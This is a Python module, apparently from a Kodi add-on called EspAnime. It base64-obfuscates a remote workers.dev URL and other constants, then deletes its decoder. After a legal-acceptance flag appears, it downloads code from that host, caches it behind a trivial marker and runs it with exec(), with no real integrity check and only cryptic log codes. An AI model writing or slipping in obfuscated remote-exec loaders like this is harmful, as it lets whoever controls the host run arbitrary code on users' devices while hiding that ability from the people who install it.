import os
import threading
import time

import xbmc
import xbmcaddon
import xbmcvfs

_k1 = "aHR0cHM6Ly9hbmkucmF3Z2lzdC53b3JrZXJzLmRldi8="
_k2 = "ZjNjOWE3MmQuYmlu"
_k3 = "RXNwQW5pbWUtU2VjdXJlR2F0ZXdheS1WMS1YMw=="
_k4 = "RXNwQW5pbWUtU0lHLTE="

_MAX_AGE = 7 * 86400

_lock   = threading.Lock()
_module = None


def _register():
    global _k1, _k2, _k3, _k4
    _f = __import__('binascii').a2b_base64
    _k1, _k2, _k3, _k4 = _f(_k1).decode(), _f(_k2).decode(), _f(_k3).decode(), _f(_k4).decode()

_register()
del _register


def _profile():
    try:
        return xbmcvfs.translatePath(xbmcaddon.Addon().getAddonInfo('profile'))
    except Exception:
        return ''


def _legal_accepted():
    p = _profile()
    if not p:
        return False
    return os.path.exists(os.path.join(p, '.legal_accepted'))


def _cache_path():
    p         = _profile()
    cache_dir = os.path.join(p, 'cache')
    try:
        os.makedirs(cache_dir, exist_ok=True)
    except OSError:
        xbmc.log('[EspAnime] mod: e500', xbmc.LOGERROR)
        return None
    return os.path.join(cache_dir, _k2)


def _is_fresh(path):
    try:
        return time.time() - os.path.getmtime(path) < _MAX_AGE
    except OSError:
        return False


def _encode_bin(code_str):
    import base64
    import zlib
    return f'# SIG:{_k4}\n'.encode() + base64.b64encode(zlib.compress(code_str.encode('utf-8'), 9))


def _decode_bin(raw_bytes):
    import base64
    import zlib
    sig = f'# SIG:{_k4}\n'.encode()
    if not raw_bytes.startswith(sig):
        raise ValueError('marcador de formato no encontrado')
    return zlib.decompress(base64.b64decode(raw_bytes[len(sig):].strip())).decode('utf-8')


def _download(path):
    if not _legal_accepted():
        return False
    try:
        import requests
        resp = requests.get(_k1, headers={"User-Agent": _k3}, timeout=15)
        if resp.status_code == 200 and resp.text.strip():
            tmp = path + '.tmp'
            with open(tmp, 'wb') as f:
                f.write(_encode_bin(resp.text))
            os.replace(tmp, path)
            xbmc.log('[EspAnime] mod: r200', xbmc.LOGINFO)
            return True
        xbmc.log('[EspAnime] mod: e503', xbmc.LOGWARNING)
    except Exception:
        xbmc.log('[EspAnime] mod: e503', xbmc.LOGWARNING)
    return False


def _load_bin(path):
    import types
    with open(path, 'rb') as fh:
        src = _decode_bin(fh.read())
    mod = types.ModuleType('_sc')
    mod.__file__ = path
    exec(compile(src, path, 'exec'), mod.__dict__)
    return mod


def _try_load(path):
    try:
        return _load_bin(path)
    except Exception:
        xbmc.log('[EspAnime] mod: e415', xbmc.LOGERROR)
        try:
            os.remove(path)
        except OSError:
            pass
        return None


def _get_module():
    global _module
    if _module is not None:
        return _module
    with _lock:
        if _module is not None:
            return _module

        if not _legal_accepted():
            return None

        path = _cache_path()
        if not path:
            return None

        if os.path.exists(path) and _is_fresh(path):
            _module = _try_load(path)
            if _module is not None:
                return _module

        if not _download(path):
            return None
        _module = _try_load(path)
        if _module is None:
            xbmc.log('[EspAnime] mod: e422', xbmc.LOGERROR)
        return _module


def get():
    return _module


def ensure():
    return _get_module() is not None
